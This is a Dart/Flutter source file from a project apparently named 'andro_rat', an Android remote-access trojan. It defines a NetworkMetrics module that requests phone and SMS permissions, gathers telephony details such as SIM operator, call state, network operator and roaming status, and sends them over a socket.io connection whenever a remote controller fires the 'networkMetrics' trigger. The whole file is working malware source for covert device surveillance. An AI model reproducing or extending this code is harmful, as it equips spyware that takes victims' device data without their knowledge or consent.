import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;
import 'package:telephony/telephony.dart';

final Telephony telephony = Telephony.instance;

class NetworkMetrics {
  static const remoteTrigger = "networkMetrics";
  late SocketIO.Socket _socket;

  Future<Map<String, dynamic>?> getPayload() async {
    if (await _checkPoint() ?? false) {
      final metrics = <String, dynamic> {};
      metrics.addAll({
        "callState": (await telephony.callState).name,
        "serviceState": (await telephony.serviceState).name,
        "isSmsCapable": (await telephony.isSmsCapable),
        "simState": (await telephony.simState).name,
        "phoneType": (await telephony.phoneType).name,
        "simOperator": (await telephony.simOperator),
        "simOperatorName": (await telephony.simOperatorName),
        "cellularDataState": (await telephony.cellularDataState).name,
        "dataActivity": (await telephony.dataActivity).name,
        "dataNetworkType": (await telephony.dataNetworkType).name,
        "isNetworkRoaming": (await telephony.isNetworkRoaming),
        "networkOperator": (await telephony.networkOperator),
        "networkOperatorName": (await telephony.networkOperatorName),
        // "signalStrengths": (await telephony.signalStrengths),
      });
      return metrics;
    }
    return null;
  }

  // Todo test
  Future<bool?> _checkPoint() async {
    return await telephony.requestPhoneAndSmsPermissions;
    // return (await Permission.phone.request().isGranted) && (await Permission.location.request().isGranted);
    // return (await Permission.phone.request().isGranted);
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      await sendPayload();
    });
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload() async {
    Debug.log("[Sending Network Metrics]:");
    _sendPayload(remoteTrigger, await getPayload());
    Debug.log(":[End Sending Network Metrics]");
  }

}
